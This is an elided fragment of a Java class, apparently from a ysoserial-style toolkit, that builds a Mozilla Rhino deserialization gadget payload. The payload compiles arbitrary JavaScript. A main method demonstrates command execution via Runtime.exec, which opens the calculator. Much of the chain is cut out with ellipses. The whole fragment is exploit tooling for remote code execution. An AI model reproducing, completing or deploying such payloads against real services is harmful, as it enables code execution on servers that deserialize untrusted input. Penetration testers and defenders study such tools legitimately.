...
public class MozillaRhino3 implements ObjectPayload<Object> {
    ...
    public Object getObject(String js ) throws Exception {
...
//        modifySerialVersionUID(ScriptableObject.class, -8193166152874109763L);
        ...
        Script script = (Script) mt.invoke(context, new Object[]{js,interpreter, null,"test", 0, null});
//        Script script = (Script) mt.invoke(context, new Object[]{command1+command2+command3,interpreter, null,"test", 0, null});
    ...
    private static void modifySerialVersionUID(Class<?> clazz, long value) throws NoSuchFieldException, IllegalAccessException {
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino3.class, new String[]{"java.lang.Runtime.getRuntime().exec('open -a calculator');"});
    }
}
